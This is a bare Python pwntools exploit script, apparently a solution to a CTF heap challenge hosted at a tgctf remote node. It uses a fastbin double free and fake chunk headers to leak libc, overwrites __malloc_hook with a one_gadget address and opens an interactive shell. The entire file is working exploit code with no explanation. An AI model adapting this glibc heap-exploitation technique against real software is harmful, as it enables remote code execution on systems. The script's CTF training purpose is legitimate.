from pwn import *
#
def add_(size,text):
	r.recvuntil(b"> ")
	r.sendline(b"1")
	r.recvuntil(b"> ")
	r.sendline(str(size))
	r.recvuntil(b"> ")
	r.send(text)
	r.recvuntil(b"good!")
def del_(index):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"> ")
	r.sendline(str(index))
	r.recvuntil(b"finish")

def edit_(text):
	
	r.recvuntil(b"> ")
	r.sendline(b"3")	
	r.send(text)

#r=process("./pwn")
r=remote("node1.tgctf.woooo.tech",30333)
pause()
r.recvuntil(b"> ")
r.send(p64(0)+p64(0x31))
add_(0x20,b'a')
add_(0x20,b'b')
del_(0)
del_(1)
del_(0)
add_(0x20,p64(0x6020C0))
add_(0x20,b'b')
add_(0x20,b'c')
add_(0x20,b'd')
edit_(p64(0)+p64(0x91)+b'a'*0x80+p64(0)+p64(0x21)+b"a"*0x10+p64(0)+p64(0x21))



del_(5)
edit_(b"a"*0x10)

r.recvuntil(b"Ah, right! nice to see you ")
r.recvuntil(b"a"*0x10)
libc=ELF("./libc.so.6")
libc_base=u64(r.recvuntil(b"\x7f").ljust(8,b"\x00"))-0x3C4B78
print(hex(libc_base))
mh_add=libc_base+libc.sym["__malloc_hook"]-0x10-0x13

edit_(p64(0)+p64(0x70)+p64(mh_add)+p64(libc_base+0x3C4B78)+b'a'*0x50+p64(0)+p64(0x21)+b'a'*0x10+p64(0)+p64(0x21))

context.log_level='debug'
del_(5)
edit_(p64(0)+p64(0x70)+p64(mh_add))
pause()
add_(0x68,b'a')
#0xf03a4
#0xf1247
one_add=0xf1247+libc_base
add_(0x68,b'a'*0x13+p64(one_add))



r.interactive()
